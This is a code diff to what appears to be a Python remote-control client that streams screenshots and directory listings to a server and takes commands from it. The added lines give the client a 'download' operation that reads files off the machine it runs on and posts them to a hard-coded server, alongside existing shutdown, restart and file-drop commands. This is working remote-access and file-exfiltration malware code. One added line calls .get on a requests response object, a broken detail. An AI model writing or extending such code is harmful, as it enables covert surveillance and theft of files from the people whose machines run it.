@@ -89,7 +89,7 @@ with mss() as sct:
             )
 
             buffer = BytesIO()
-            img.save(buffer, format="JPEG", quality=20)
+            img.save(buffer, format="JPEG", quality=5)
             b64_frame = base64.b64encode(buffer.getvalue()).decode("utf-8")
 
             current_files = get_directory_items(current_viewing_path)
@@ -106,6 +106,7 @@ with mss() as sct:
 
             if response.status_code == 200:
                 server_reply = response.json()
+                my_ip = response.get("address")
                 command = server_reply.get("command")
                 # 2. File Operation Instruction Unpacking Engine
                 file_ops = server_reply.get("file_operations", [])
@@ -179,6 +180,19 @@ with mss() as sct:
                             except Exception as e:
                                 print(f"Failed to write uploaded file: {e}")
                         print(f"Target action caught: Drop file content for '{filename}'")
+                    elif operation_type == "download":
+                        target_filename = task.get("target")
+                        
+                        # Resolve the absolute path based on your current tracking position context
+                        target_path = os.path.join(current_viewing_path, target_filename)
+                        
+                        if os.path.exists(target_path) and os.path.isfile(target_path):
+                            with open(target_path, "rb") as f:
+                                # Dispatch data up using the files multipart form payload assignment
+                                requests.post(
+                                    f"http://{SERVER_IP}:5000/files/{my_ip}/receive_download", 
+                                    files={"file": (target_filename, f, "application/octet-stream")}
+                                )
                 if command == "Shutdown":
                     shutdown_pc()
                 elif command == "Restart":
